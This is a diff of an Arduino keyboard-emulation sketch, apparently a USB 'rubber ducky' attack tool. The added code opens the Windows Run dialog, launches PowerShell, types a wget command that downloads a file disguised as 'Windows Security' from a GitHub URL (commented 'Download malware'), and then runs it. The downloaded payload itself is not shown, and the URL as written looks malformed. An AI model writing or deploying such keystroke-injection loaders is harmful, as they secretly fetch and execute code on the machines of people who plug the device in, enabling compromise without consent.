@@ -1,11 +1,12 @@
 #include <Keyboard.h>
 
 void setup() {
-  // put your setup code here, to run once:
+  // Start the keyboard class
   Keyboard.begin();
 
-  delay(1000);
+  delay(1000); // maybe delete
 
+  // Open run window (Windows + r)
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(10);
@@ -13,14 +14,27 @@ void setup() {
 
   delay(200);
 
-  Keyboard.print("cmd");
-
+  // Run windows powershell
+  Keyboard.print("powershell");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
+  // Wait for command prompt to open
   delay(1000);
   
-  Keyboard.print("Fuck you");
+  // Download malware
+  Keyboard.print("wget https://www.github.com/The-TT-Hacker/usb-rubber-ducky/Windows Security");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  //Wait for program to download
+  delay(5000);
+
+  // Run malware
+
+  Keyboard.print("./Windows Security");
+
+
 }
 
 void loop() {
